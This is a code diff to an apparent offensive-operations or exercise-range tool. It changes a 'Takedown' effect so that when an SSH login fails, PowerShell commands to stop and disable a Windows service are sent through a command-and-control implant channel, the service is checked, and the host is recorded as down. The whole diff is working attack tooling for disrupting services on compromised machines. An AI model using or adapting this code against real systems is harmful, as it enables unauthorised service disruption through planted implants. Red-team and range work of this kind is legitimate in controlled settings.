@@ -290,6 +290,30 @@ class Takedown(Effect):
                                              renamed=renamed.group(1) if renamed else None,
                                              conf=conf.group(1) if conf else None))
 
+    def _windows_via_channel(self, ctx, ip, stop, check, label, expect):
+        c2 = getattr(ctx, "c2", None)
+        if c2 is None:
+            return None
+        from .implant_channel import box_id_for
+        key = box_id_for(ctx, ip)
+        try:
+            outcome = c2.task(key, stop, timeout=120)
+        except Exception:
+            return None
+        if not outcome.get("task_id") or not outcome.get("ok"):
+            return None
+        try:
+            status = c2.task(key, check, timeout=120)
+        except Exception:
+            return None
+        output = str(status.get("output") or "").strip()
+        if expect not in output:
+            return Result(False, f"{label} still reporting {output[:80]!r} on {ip} "
+                                 f"(via C2)")
+        return Result(True, f"{label} is DOWN on {ip} (stop_disable via C2)",
+                      impact={"ip": ip, "service": label, "mode": "stop_disable"},
+                      restore=windows_restore_recipe(label))
+
     def _windows(self, ctx, ip, fh, unit):
         key = unit.lower().removesuffix(".service").strip()
         if key in ("ssh", "sshd"):
@@ -300,9 +324,20 @@ class Takedown(Effect):
                      f"Set-Service '{unit}' -StartupType Disabled",
                      f"(Get-Service '{unit}').Status", unit, "Stopped")
         stop, check, label, expect = found
-        rc, out, err = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", stop,
-                                   timeout=60, windows=True, key_path=fh.get("key_path"))
+        try:
+            rc, out, err = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", stop,
+                                       timeout=60, windows=True, key_path=fh.get("key_path"))
+        except Exception:
+            # The DC's built-in Administrator can be disabled by the AD DS promotion,
+            # so the SSH login is closed while the C2 channel is live (live: cde-2026).
+            via = self._windows_via_channel(ctx, ip, stop, check, label, expect)
+            if via is not None:
+                return via
+            raise
         if rc != 0:
+            via = self._windows_via_channel(ctx, ip, stop, check, label, expect)
+            if via is not None:
+                return via
             return Result(False, f"powershell rc={rc}: {(err or out).strip()[:200]}")
         rc, out, _ = ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", check,
                                  timeout=30, windows=True, key_path=fh.get("key_path"))
